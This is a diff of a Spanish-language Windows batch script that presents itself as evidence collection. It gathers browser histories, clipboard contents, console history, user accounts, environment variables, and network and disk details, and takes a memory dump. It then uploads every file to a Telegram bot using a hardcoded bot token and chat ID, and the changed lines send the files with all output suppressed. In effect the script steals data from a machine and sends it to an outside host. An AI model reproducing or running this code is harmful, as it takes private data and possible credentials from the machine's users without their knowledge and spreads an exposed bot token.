@@ -9,7 +9,7 @@ echo.
 :: 1. CREAR CARPETA PRINCIPAL
 :: ============================================
 mkdir C:\EVIDENCIAS_COMPLETAS 2>nul
-echo [OK] Carpeta C:\EVIDENCIAS_COMPLETAS creada
+echo Carpeta C:\EVIDENCIAS_COMPLETAS creada
 
 :: ============================================
 :: 2. RECOLECTAR EVIDENCIAS DIGITALES
@@ -127,7 +127,7 @@ echo. >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt
 wmic logicaldisk get deviceid,size,freespace,volumename >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt
 
 :: ============================================
-:: 4. GENERAR VOLCADO DE RAM CON WINPMEM
+:: 4. GENERAR VOLCADO DE RAM CON PROCDUMP
 :: ============================================
 echo.
 echo ============================================================
@@ -135,27 +135,13 @@ echo   GENERANDO VOLCADO DE MEMORIA RAM (FTK Imager)
 echo ============================================================
 echo.
 
-:: Descargar WinPmem
-echo [INFO] Descargando WinPmem...
-curl -L -o C:\EVIDENCIAS_COMPLETAS\winpmem_mini_x64.exe https://github.com/Velocidex/WinPmem/releases/download/v4.0/winpmem_mini_x64.exe
-
-:: Verificar descarga
-if exist C:\EVIDENCIAS_COMPLETAS\winpmem_mini_x64.exe (
-    echo [OK] WinPmem descargado correctamente
-    echo [INFO] Ejecutando WinPmem para generar memory.raw...
-    C:\EVIDENCIAS_COMPLETAS\winpmem_mini_x64.exe C:\EVIDENCIAS_COMPLETAS\memory.raw
-    if exist C:\EVIDENCIAS_COMPLETAS\memory.raw (
-        echo [OK] Volcado de RAM generado: memory.raw
-    ) else (
-        echo [ERROR] No se pudo generar memory.raw
-    )
+:: Verificar que procdump.exe existe
+if exist C:\EVIDENCIAS_COMPLETAS\procdump.exe (
+    echo Ejecutando procdump.exe...
+    C:\EVIDENCIAS_COMPLETAS\procdump.exe -ma -accepteula C:\EVIDENCIAS_COMPLETAS\memory.dmp
+    echo Volcado de RAM generado: memory.dmp
 ) else (
-    echo [ERROR] No se pudo descargar WinPmem
-    echo [INFO] Intentando usar procdump.exe como alternativa...
-    if exist C:\EVIDENCIAS_COMPLETAS\procdump.exe (
-        echo [INFO] Usando procdump.exe -ma...
-        C:\EVIDENCIAS_COMPLETAS\procdump.exe -ma -accepteula C:\EVIDENCIAS_COMPLETAS\memory.dmp
-    )
+    echo ERROR: No se encuentra procdump.exe
 )
 
 :: ============================================
@@ -182,99 +168,37 @@ echo - 08_variables.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo - 09_discos.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo - chrome_history_backup.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo - edge_history_backup.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
-if exist C:\EVIDENCIAS_COMPLETAS\memory.raw (
-    echo - memory.raw (Volcado de RAM para FTK Imager) >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
-)
-if exist C:\EVIDENCIAS_COMPLETAS\memory.dmp (
-    echo - memory.dmp (Volcado alternativo) >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
-)
+echo - memory.dmp (Volcado de RAM) >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo              FIN DEL INFORME >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 
 :: ============================================
-:: 6. ENVIAR A TELEGRAM (CON MENSAJES VISIBLES)
+:: 6. ENVIAR A TELEGRAM
 :: ============================================
 echo.
-echo ============================================================
-echo   ENVIANDO ARCHIVOS A TELEGRAM
-echo ============================================================
-echo.
+echo Enviando archivos a Telegram...
 
 set BOT_TOKEN=8886338270:AAHbMMSRXqOSKKc5CaTiw2mdWACnV_0Zd2Q
 set CHAT_ID=5064456618
 
-:: Probar conexión con Telegram
-echo [INFO] Probando conexión con Telegram...
-curl.exe -s "https://api.telegram.org/bot%BOT_TOKEN%/getMe"
-echo.
-
-:: Enviar archivos de texto (uno por uno, con mensajes)
-echo [INFO] Enviando 00_INFORME_FINAL.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 01_historial_navegacion.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 02_portapapeles.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 03_historial_consola.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 04_estructura_MAC.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 05_sistema.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\05_sistema.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 06_red.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\06_red.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 07_usuarios.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 08_variables.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\08_variables.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando 09_discos.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\09_discos.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando chrome_history_backup.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-echo [INFO] Enviando edge_history_backup.txt...
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-echo.
-
-:: Enviar volcado de RAM (si existe)
-if exist C:\EVIDENCIAS_COMPLETAS\memory.raw (
-    echo [INFO] Enviando memory.raw (esto puede tardar varios minutos)...
-    curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.raw" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-    echo [OK] Volcado de RAM enviado.
-) else (
-    echo [ERROR] No se encontró memory.raw
-)
-
-if exist C:\EVIDENCIAS_COMPLETAS\memory.dmp (
-    echo [INFO] Enviando memory.dmp (volcado alternativo)...
-    curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
-)
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\03_historial_consola.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\04_estructura_MAC.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\05_sistema.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\06_red.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\07_usuarios.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\08_variables.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\09_discos.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 
 echo.
 echo ============================================================
-echo   PROCESO COMPLETADO
+echo   TODOS LOS ARCHIVOS ENVIADOS A TELEGRAM
 echo ============================================================
 echo.
 echo Archivos generados en: C:\EVIDENCIAS_COMPLETAS\
